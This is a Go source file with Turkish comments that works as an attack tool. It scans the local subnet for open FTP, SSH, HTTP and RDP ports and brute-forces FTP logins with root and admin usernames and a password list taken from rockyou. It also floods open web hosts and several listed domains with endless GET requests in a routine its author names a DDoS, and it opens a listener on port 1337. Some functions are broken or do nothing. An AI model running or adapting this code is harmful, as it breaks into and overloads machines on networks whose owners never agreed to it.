package main

/*
	FikiFiki bu uygulamanın ne yaptığı pek belli değildir. Kafanıza göre editleyebilir,
	istediğiniz şekilde şey edebilirsiniz.


	ScanNetwork fonksiyonu istenildiği gibi genişlenitebilir istenilirse belli başlı portlar
	İstenirse 1-65555 arası tüm portlar taratınabilir ve ona göre brute force uygulanabilir.
	Timeout süresi düşürülerek çok hızlı bir şekilde bu işlemlerin bitirilmesi sağlanabilir.


	Bazıları dünyanın sonu ateşle gelecek der, bazıları ise buzla.
	Anladığım kadar, benim aklım ateşten olanlara kanar.
	Ama iki kez yok olacaksa eğer, çoktandır nefreti de tattığımdan.
	Buzdan batmak da görkemli olacak.
	Nefretler ancak böyle sönecek...
	6/27/2017 | 8:58PM

 */


import (
	"runtime"
	"net"
	"log"
	"strings"
	"fmt"
	"net/http"
	"time"
	"github.com/dutchcoders/goftp"
	"crypto/tls"
//	"syscall"
)

/*
var (
	kernel32, _        = syscall.LoadLibrary("kernel32.dll")
	advapi32, _ 	   = syscall.LoadLibrary("Advapi32.dll")
	user32,_		   = syscall.LoadLibrary("user32.dll")
)

*/

var PortList = []string{"21", "22", "23", "51", "80", "111", "137", "139", "445", "443", "3389"}
var OpenHTTP []string
var OpenFTP []string
var OpenSSH []string
var OpenRDP []string


var Username = []string{"root", "admin", "administrator"}

// rockyou.txt
var Password = []string{"123456", "12345", "123456789", "password", "iloveyou", "princess", "1234567", "rockyou", "12345678", "abc123", "nicole", "daniel", "babygirl",
						"monkey", "lovely", "jessica", "654321", "michael", "ashley", "qwerty", "111111", "iloveu", "000000", "michelle", "tigger", "sunshine", "chocolate",
						"password1", "soccer","anthony","friends","butterfly","purple","angel","jordan","liverpool","justin","loveme","fuckyou","123123","football","secret",
						"andrea","carlos","jennifer","joshua","bubbles","1234567890","superman","hannah","amanda","loveyou","pretty","basketball","andrew","angels","tweety",
						"flower","playboy","hello","elizabeth","hottie","tinkerbell","charlie","samantha","barbie","chelsea","lovers","teamo","jasmine","brandon","666666","shadow","melissa","eminem",
						"matthew","robert","danielle","forever","family","jonathan","987654321","computer","whatever","dragon","vanessa","cookie","naruto","summer","sweety","spongebob","joseph",
						"junior","softball","taylor","yellow","daniela","lauren","mickey","princesa","alexandra","alexis","jesus","estrella","miguel","william","thomas","beautiful","mylove","angela",
						"poohbear","patrick","iloveme","sakura","adrian","alexander","destiny","christian","121212","sayang","america","dancer","monica","richard","112233","princess1","555555","diamond",
						"carolina","steven","rangers","louise","orange","789456","999999","shorty","11111","nathan","snoopy","gabriel","hunter","cherry","killer","sandra","alejandro","buster","george","brittany",
						"alejandra","patricia","rachel","tequiero","7777777","cheese","159753","arsenal","dolphin","antonio","heather","david","ginger","stephanie","peanut","blink182","sweetie","222222","beauty",
						"987654","victoria","honey","00000","fernando","pokemon","maggie","corazon","chicken","pepper","cristina","rainbow","kisses","manuel","myspace","rebelde","angel1","ricardo","babygurl","heaven",
						"55555","baseball","martin","greenday","november","alyssa","madison","mother","123321","123abc","mahalkita","batman","september","december","morgan","mariposa","maria","gabriela","iloveyou2","bailey",
						"jeremy","pamela","kimberly","gemini","shannon","pictures","asshole","sophie","jessie","hellokitty","claudia","babygirl1","angelica","austin","mahalko","victor","horses","tiffany",
						"mariana","eduardo","andres","courtney","booboo","kissme","harley","ronaldo","iloveyou1","precious","october","inuyasha","peaches","veronica","chris","888888","adriana","cutie","james",
						"banana","prince","friend","jesus1","crystal","celtic","zxcvbnm","edward","oliver","diana"}


var MalwareDomainList = []string{
	"htt://litra.com.mk/wp-sts.php",
	"http://nmsbaseball.com/post.php?id=144840",
	"fbku.com",
	"analxxxclipsyjh.dnset.com",
	}


func ReverseIPAddress(ip net.IP) {
	for {
		if ip.To4() != nil {

			addressSlice := strings.Split(ip.String(), ".")
			reverseSlice := []string{}

			for i := range addressSlice {
				octet := addressSlice[len(addressSlice)-1-i]
				reverseSlice = append(reverseSlice, octet)
			}
		} else {
		}
	}

}

// Gereksiz fonksiyon diyebiliriz hemn uygulamanın devamını sürdürebilmek için kullanılabilir. Veya bu fonksiyonun
// Dinlediği porta bağlanılıp network üzerinden izlenilebilir.
func ListenPort() {
	Listen, err := net.Listen("tcp", "localhost:1337")
	if err != nil {
		//panic(err)
	} else {
		for {
			conn, err := Listen.Accept()
			if err != nil {
				//panic(err)
			} else {
				conn.Write([]byte("Welcome to the machine!!!!\n")) // Bağlanan kişiye gönderilen mesaj.
			}
		}
	}
}

// Parametre olarak İp listesi, ve int bir değer alıyor.
// Döngüler yardımı ile HTTP Portu açık olan bilgisayarın ip leri alınıp verilen int kadar thread oluşturup HTTP istekleri atılıyor.
func HTTPDDoSGet(TargetURL []string, Thread int) {
	for i := 0; i < Thread; i++ {
		for j := range OpenHTTP {
			go InfiniteGet(OpenHTTP[j])
		}

	}
}


// InfiniteLoop
func InfiniteGet(TargetURL string) {
	for {
		Response, err := http.Get(TargetURL) // Get isteği gönderiliyor.
		CloseConnection(Response, err)
		time.Sleep(1 * time.Millisecond)
	}
}

func CloseConnection(Response *http.Response, err error) {
	if err != nil {
		//fmt.Println(err.Error())
	}
	if Response != nil {
		//io.Copy(ioutil.Discard, Response.Body)
		Response.Body.Close()
	}
}

// Verilen ip adresi sürekli olarak arttılıyor.
// e.g 192.168.1.21 - 192.168.1.22 diye ilerliyor.
func Increment(IP net.IP) {
	for j := len(IP) - 1; j >= 0; j-- {
		IP[j]++
		if IP[j] > 0 {
			break
		}
	}
}

// Local Ip adresi elde ediliyor.
func GetOutboundIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().String()
	idx := strings.LastIndex(localAddr, ":")

	return localAddr[0:idx]
}


// Bu fonksiyon verilen ip adresine göre tüm network listesini çıkarıyor. Yukarıdaki Increment fonksiyonu yardımıyla.
func AllHosts(Cidr string) ([]string, error) {
	IpAddr, Ipnet, err := net.ParseCIDR(Cidr)
	if err != nil {
		return nil, err
	}

	var IpAddress []string
	for IpAddr := IpAddr.Mask(Ipnet.Mask); Ipnet.Contains(IpAddr); Increment(IpAddr) {
		IpAddress = append(IpAddress, IpAddr.String())
	}

	return IpAddress[1 : len(IpAddress)-1], nil
}



// Öteki şekilde Local Ip alınıyor.
/*
func GetLocalIP() string {
	Addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}
	for _, Address := range Addrs {
		if Ipnet, Ok := Address.(*net.IPNet); Ok && !Ipnet.IP.IsLoopback() {
			if Ipnet.IP.To4() != nil {
				return Ipnet.IP.String()
			}
		}
	}
	return ""
}
*/


// Network Taraması yapılıyor.
func ScanNetwork(IpList []string ) {
	for i := range IpList { // AllHost fonksiyonun döndürdüğü dize veriliyor ve for ile içindeki tüm ip adresleri için aynı işlem yapılıyor.
		for j := range PortList {
			Target := IpList[i] + ":" + PortList[j] // İplerin, yukarıda belirtildiği port adreslerine istek atılıyor
													// e.g 192.168.1.44:21 || 10.10.10.32:80
			fmt.Printf("Bağlanılıyor: %s\n", Target)	// Console uygulaması olarak derlendiğnde bilgi amaçlı ekrana basma mevzusu.
			conn, err := net.DialTimeout("tcp", Target,time.Second / 50) // Verieln IpAdresine bağlanılıyor timeout 60/20 saniye.
			if err != nil {

			} else {
				fmt.Printf("%s is online!\n", Target)
				conn.Write([]byte("FikiFiki")) // Eğer belirtilen ipnin belirtilen portuna bağlantı var ise karşıya Fikifiki mesajı gönderiliyor.
													// Aynı zamanda networkdeki açık makinanın ipsini porta göre listeye atıyor
				if PortList[j] == "80" {			// Verilen ipnin 80. portu açık ise OpenHTTP isimli bir listeye atılıyor bu ip
					OpenHTTP = append(OpenHTTP, Target) // e.g 192.168.1.1:80 halinde diğer işlemlerde aynısı fakat farklı portlar.
				} else if PortList[j] == "21" {
					OpenFTP = append(OpenFTP, Target)
				} else if PortList[j] == "22" {
					OpenSSH = append(OpenSSH, Target)
				} else if PortList[j] == "3389" {
					OpenRDP = append(OpenRDP, Target)
				}
			}
		}
	}
}
// FTP Brute force fonksiyonu çoğaltılabilir SSH, Telnet tarzı diğer servisler için kullanılabilir.
// ScanNetwork isimli fonksiyonundan oluşan array ile çalışmakta yani FTP Portu açık olan bilgisayarların ipsi listeye atılıp
// Burada kulalnılıyor.

func FTPBruteForce() {
	var err error
	var ftp *goftp.FTP

	for i := range OpenFTP {
		if ftp, err = goftp.Connect(OpenFTP[i]); err == nil { // OpenFTP[i] = networkdeki FTP servisi açık olan bilgisayarlara bağlanmaya çalışıyor
			config := tls.Config{
				InsecureSkipVerify: true,
				ClientAuth: tls.RequestClientCert,
			}
			if err = ftp.AuthTLS(&config); err != nil {
				//panic(err)
			}

			// Yukarıda belirtilen Usernamelerin alayını alıp alayı için tekrardan yukarıda bulunan ufak wordlistin her kelimesi için şifre denemesi yapılıyor
			for j := range Username {
				for k := range Password {
					if err = ftp.Login(Username[j], Password[k]); err != nil {
						fmt.Printf("Hedef: %s\nUsername: %s\nPassword: %s\n", OpenFTP[i], Username[j], Password[k])
					} else {
						// Bağlantı gerçekleştiyse eğer pwd ile dizin alıp çıkıyor.
						if curpath, err := ftp.Pwd(); err != nil {
							//panic(err)
							curpath = curpath
						}
					}
				}
			}
		}
	}
}

func main() {
	runtime.GOMAXPROCS(2) // Uygulamanın kaç CPU kullanacağını belirler tüm CPU kullanmak için parametre için runtime.NumCPU() fonksiyonu parametre verilmelidir.
	LocalIp := GetOutboundIP() // uygulamanın çalıştığı bilgisayarın local ip'yi almak için GetLocalIp fonksiyonuda kullanılabildiği için dışarıya giden paketten
								// local ip alınıyor ve bir değişkene yazılıyor.
	LocalIp = LocalIp + "/24"   // local ip'nin sonuna /24 takısı yerleştiriliyor // e.g 10.10.10.9/24
	IpAddr, _ := AllHosts(LocalIp)  // Local IP Parametre olarak Allhost fonksiyonuna veriliyor. AllHost fonksiyonu 255'e kadar ipleri yazdırıyor
									// e.g 10.10.10.1 - 10.10.10.2 - 10.10.10.3 - 10.10.10.4

	go HTTPDDoSGet(MalwareDomainList, 50) // Belirlenen malware sitelerine Get
	go InfiniteGet("http://exploit.casa:80") // loop içinde Get request
	go ReverseIPAddress(net.ParseIP("216.239.38.21")) // REverseIp
	ScanNetwork(IpAddr)  // IP'ler IpAddr değişkeninde bir liste halinde iken ScanNetwork fonksiyonuna parametre olarak veriliyor.
	go FTPBruteForce() // FTPBruteForce
	go HTTPDDoSGet(OpenHTTP, 50) // Network IP'leri içinde 80 portu açık olana infinite Get
	ListenPort() // listen 1337.
}